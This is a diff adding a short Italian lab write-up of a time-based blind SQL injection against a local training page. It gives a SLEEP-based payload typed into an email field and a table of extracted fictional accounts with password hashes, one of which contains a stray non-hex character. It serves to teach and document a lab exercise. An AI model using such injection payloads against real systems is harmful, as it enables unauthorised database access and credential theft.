@@ -1,0 +1,13 @@
+Per ottenere i dati contenuti nella accounts ho utilizzato la seguente pagina: http://192.168.33.10/sqli/time_based_blind.php
+Dato che la pagina restituisce sempre la stessa risposta non posso ottenerne dati utili, quindi ho provato ad utilizzare una SLEEP,
+inserendo "arthur@guide.com' AND SLEEP(5) -- -" nel campo email, così facendo mi sono accertato che il campo fossse iniettabile.
+Quindi ho progettato il tool in modo tale da automatizzare l'attacco ed ottenere i dati richiesti.
+I dati sono salvati nel file "Challenge 1 - data" e le istruzioni utilizzate nel file "Challenge 1 - log".
+Inoltre qui sotto sono presentati i dati in forma più leggibile.
+
+scotchbox -> accounts
+id	first_name	last_name	email			password
+1	Arthur		Dent		arthur@guide.com	d00ee262cdcbe7543210bb85f6f1cac257b4e994
+2	Ford		Prefect		ford@guide.com		30f5cc99c17426a0d28acf8905c6d776039ad022
+3	Tricia		McMillan	tricia@guide.com	bcb3358e273b5772ee0Øe1799b612e13cc726b04
+4	Zaphod		Beeblebrox	zaphod@guide.com	0c38530eaca4dbc0f49c459c0c52b362f14215c3
